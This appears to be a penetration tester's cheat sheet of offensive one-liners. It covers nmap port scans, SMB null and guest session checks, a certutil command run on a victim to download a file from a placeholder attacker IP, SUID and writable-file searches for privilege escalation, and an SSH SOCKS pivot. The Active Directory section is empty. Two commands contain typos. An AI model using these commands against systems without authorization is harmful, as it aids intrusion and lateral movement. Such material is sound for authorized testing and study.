# Oneliners

A compilation of useful oneliners.

## General:

Thorough aggressive scan of all ports with default scripts and service detection.
- `nmap -sC -sV -T4 -p- $IP`

Fast UDP scan
- `sudo nmap -sUV -F -T4 $IP`

## Windows:

Test null session (SMB port 445)
- `nxc smb $IP -u '' -p ''`

Test for guest logon (SMB port 445)
- `nxc smb $IP -u 'a' -p ''`

File transfer using certutil (Ran from victim machine)
- `certutil -urlcache -f http://<attacker_ip>/example.txt example.txt`

## Linux:

Find all `SUID` binaries.
- `find '/' 2>/dev/null -perm /4000`

Find all `SGID` binaries
- `find '/' 2>/dev/null -perm /2000`

Find all `root` owned files writeable by the current user.
- `find '/' 2>/dev/null -writable -user 'root'`

List all open ports, including internal.
- `ss -tunlp`

`ssh` into victim and open a socks proxy.
- `ssh -D <PROXYCHAINS_PORT <USER>@<VICTIM>`

Outputs a list of all processes running as `root`, excluding kernel processes.
- `ps -o ruser=RealUser -o pid,cmd -u root | grep -v "\["`

Outputs a list of all processes running as `<USER>`
- `ps -o ruser=RealUser -o pid,cmd -u <USER>"`

Outputs a list of all processes:
-  `ps aux`

## Active Directory:
